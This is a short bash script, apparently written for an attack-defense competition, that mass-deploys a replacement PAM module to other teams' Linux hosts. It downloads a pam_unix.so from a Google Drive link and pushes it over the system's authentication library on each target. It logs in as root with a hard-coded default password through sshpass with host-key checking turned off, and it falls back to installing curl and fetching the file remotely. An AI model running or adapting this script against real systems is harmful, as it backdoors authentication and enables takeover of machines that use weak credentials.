#!/bin/bash

username="root"
password="Password1!"

timeout=5
max_jobs=10
path_to_pam="/lib/x86_64-linux-gnu/security/pam_unix.so"
path_to_tmp_pam="/tmp/pam_unix.so"
link_to_pam="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"

network_id="1.1"
number_of_teams=10
my_team=5
host_ids=(1 2 3)

main() {
    curl -o "$path_to_tmp_pam" "$link_to_pam"

    local IPs=()
    for ((team=1; team<=number_of_teams; team++)); do
        if [[ $team -eq $my_team ]]; then
            continue
        fi
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done

    local job_count=0
    for IP in "${IPs[@]}"; do
        {
            sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_tmp_pam" "$username@$IP:$path_to_pam" && \
            echo "SUCCESS        (SCP): $IP" || \
            sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
                echo \"$password\" | sudo -S apt install -y curl && \
                echo \"$password\" | sudo -S yum install -y curl && \
                echo \"$password\" | sudo -S zypper install -y curl && \
                echo \"$password\" | sudo -S pacman -Syu curl --noconfirm && \
                echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\" && \
                echo \"$password\" | sudo -S mv \"$path_to_tmp_pam\" \"$path_to_pam\"
            " && \
            echo "SUCCESS       (CURL): $IP" || \
            echo -e "\n!!!!!!!!!!!!!!!!!!!!!\nFAIL   (SSH or CURL): $IP !!\n!!!!!!!!!!!!!!!!!!!!!\n"
        } &
        ((job_count++))
        if ((job_count >= max_jobs)); then
            wait -n
            ((job_count--))
        fi
    done
    wait
}

main
